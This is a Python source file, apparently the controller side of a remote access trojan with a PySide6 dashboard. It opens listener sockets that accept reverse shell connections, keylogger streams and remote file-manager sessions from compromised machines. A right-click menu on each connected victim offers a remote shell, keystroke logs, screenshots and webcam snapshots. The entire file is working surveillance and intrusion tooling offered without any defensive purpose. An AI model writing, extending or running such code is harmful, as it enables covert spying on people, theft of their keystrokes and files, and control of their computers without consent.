import socket
import threading
import psutil


from PySide6.QtCore import QObject, QPoint, Qt
from PySide6.QtWidgets import QMenu, QTableWidgetItem
from .Client_Handler import Client
from PySide6.QtCore import QPoint, Qt
from PySide6.QtWidgets import QMenu
from .ui_dashboard import Ui_MainWindow
from .ui_terminal import TerminalWindow as Ui_MainWindow2
from treeview import FileManagerServer
from keylog_ui import  MainWindow as Ui_KeylogWindow
from .Client_Handler import Client
def get_wifi_ipv4():
    for interface, addrs in psutil.net_if_addrs().items():
        if "Wi-Fi" in interface or "Wireless" in interface:  # Adjust this for different adapter names
            for addr in addrs:
                if addr.family == socket.AF_INET:  # Check for IPv4
                    return addr.address
    return None
# SERVER_HOST = socket.gethostbyname(socket.gethostname())
SERVER_HOST = get_wifi_ipv4()
print(SERVER_HOST)
SERVER_PORT_KEYLOGGER = 5000
SERVER_PORT_SHELL = 5005
SERVER_PORT_MANAGE_FILE = 5050
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
# create a socket object




class Server_Handler(QObject):
    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.ui: Ui_MainWindow = main_window.ui
        self.ui.tableWidget.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.ui.tableWidget.customContextMenuRequested.connect(self.onRightClick)
        self.list_client = []
        self.ui.cnt = 0
        self.cur_client = Client(self.ui.cnt,self.ui)
        print("create new server handler")

        s1 = socket.socket()
        s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s1.bind((SERVER_HOST, SERVER_PORT_SHELL))
        s1.listen(5)

        s2 = socket.socket()
        s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s2.bind((SERVER_HOST, SERVER_PORT_KEYLOGGER))
        s2.listen(5)

        s3 = socket.socket()
        s3.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s3.bind((SERVER_HOST, SERVER_PORT_MANAGE_FILE))
        s3.listen(5)


        self.ui.second_window = []
        self.ui.second_window.append(Ui_MainWindow2())
        self.ui.manage_file_window = []
        self.ui.keylog_window = []
        self.ui.second_window.append(Ui_MainWindow2())
        self.ui.manage_file_window.append(FileManagerServer())
        self.ui.keylog_window.append(Ui_KeylogWindow())
        self.ui.second_window.append(Ui_MainWindow2())
        self.ui.manage_file_window.append(FileManagerServer())
        self.ui.keylog_window.append(Ui_KeylogWindow())



        self.t1 = threading.Thread(target=self.reverse_shell, args=(s1,))
        self.t2 = threading.Thread(target=self.key_logger, args=(s2,))
        self.t3 = threading.Thread(target=self.manage_file, args=(s3,))

        self.t1.start()
        self.t2.start()
        self.t3.start()




    def add_client_to_tree(self,a,b,c):
        current_row_count = self.ui.tableWidget.rowCount()

        self.ui.tableWidget.insertRow(current_row_count)

        self.ui.tableWidget.setItem(current_row_count, 0, QTableWidgetItem(a))
        self.ui.tableWidget.setItem(current_row_count, 1, QTableWidgetItem(b))
        self.ui.tableWidget.setItem(current_row_count, 2, QTableWidgetItem(c))
        self.ui.tableWidget.setItem(current_row_count, 3, QTableWidgetItem("Connected"))



    def reverse_shell(self,s1):
        print(f"Listening as {SERVER_HOST}:{SERVER_PORT_SHELL} ...")
        while True:
            print(f"Listening as {SERVER_HOST}:{SERVER_PORT_SHELL} ...")
            socket, client_add = s1.accept()
            print(f"{client_add[0]}:{client_add[1]} Connected!\n")
            cwd = socket.recv(BUFFER_SIZE).decode()
            # ui.second_window.append(Ui_MainWindow2())
            self.ui.second_window[self.ui.cnt].print_text(f"{cwd} $>")
            self.ui.second_window[self.ui.cnt].socket = socket
            infor = socket.recv(BUFFER_SIZE).decode()
            list_infor = infor.split(SEPARATOR)
            self.add_client_to_tree(list_infor[0], list_infor[1], list_infor[2])
            self.ui.keylog_window[self.ui.cnt].setWindowTitle(list_infor[1] + "@KeyLog")
            self.ui.keylog_window[self.ui.cnt].filename = list_infor[1] + '.txt'
            # ui.keylog_window[ui.cnt].show()
            self.cur_client.increase()
            if self.cur_client.cnt == 3:
                self.list_client.append(self.cur_client)
                self.cur_client.cnt += 1
                self.ui.cnt += 1
                self.cur_client = Client(self.ui.cnt, self.ui)

    def key_logger(self,s2):
        print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
        while True:
            print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
            socket, client_add = s2.accept()
            # ui.keylog_window.append(Ui_KeylogWindow())
            self.cur_client.add_keylog(socket)
            self.cur_client.increase()
            if self.cur_client.cnt == 3:
                self.list_client.append(self.cur_client)
                self.cur_client.cnt += 1
                self.ui.cnt += 1
                self.cur_client = Client(self.ui.cnt, self.ui)

    def manage_file(self,s3):
        global cur_client
        print(f"Listening as {SERVER_HOST}:{SERVER_PORT_MANAGE_FILE} ...")
        while True:
            print(f"Listening as {SERVER_HOST}:{SERVER_PORT_MANAGE_FILE} ...")
            socket, client_add = s3.accept()
            # ui.manage_file_window.append(FileManagerServer())
            self.ui.manage_file_window[self.ui.cnt].socket = socket
            self.cur_client.add_manage_file(socket)
            print(f"{client_add[0]}:{client_add[1]} Connected!\n")
            self.cur_client.increase()
            if self.cur_client.cnt == 3:
                self.list_client.append(self.cur_client)
                self.cur_client.cnt += 1
                self.ui.cnt += 1
                self.cur_client = Client(self.ui.cnt, self.ui)

    def onRightClick(self, position: QPoint):
        # Find the row that was clicked
        row = self.ui.tableWidget.rowAt(position.y())

        if row != -1:  # Make sure a valid row is clicked
            # Create the context menu
            contextMenu = QMenu(self.ui.tableWidget)

            # Add actions to the menu
            remoteShell = contextMenu.addAction("Remote Shell")
            keylog = contextMenu.addAction("Keylogger")
            screenShot = contextMenu.addAction("Screenshot")
            webCam = contextMenu.addAction("Webcam snapshot")
            showDir = contextMenu.addAction("File Manager")

            # Optional: Add separator between groups of actions
            contextMenu.addSeparator()
            action5 = contextMenu.addAction("Disconnect")

            # Show the context menu at the cursor's current position
            # and get the selected action
            action = contextMenu.exec(self.ui.tableWidget.mapToGlobal(position))

            # Handle the selected action
            if action == remoteShell:
                print(f"call remoteshell at {row}")
                self.ui.second_window[row].show()
            elif action == keylog:
                self.ui.keylog_window[row].readfile()
                self.ui.keylog_window[row].show()
            elif action == screenShot:
                # self.srceen_shot()
                self.ui.second_window[row].screen_shot("src")
            elif action == webCam:
                self.ui.second_window[row].screen_shot("webcam")
            elif action == showDir:
                self.ui.manage_file_window[row].show()
